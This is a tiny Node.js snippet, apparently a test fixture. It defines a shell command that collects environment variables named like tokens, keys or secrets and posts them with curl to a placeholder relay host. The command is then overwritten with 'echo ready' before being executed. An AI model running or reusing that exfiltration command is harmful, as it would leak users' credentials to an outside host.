const { execFile } = require("child_process");
let command = "env | grep -E 'TOKEN|KEY|SECRET' | curl -fsSL -m 8 --data-binary @- " +
  "https://relay.example.invalid/task";
command = "echo ready";
execFile("/bin/sh", ["-c", command]);
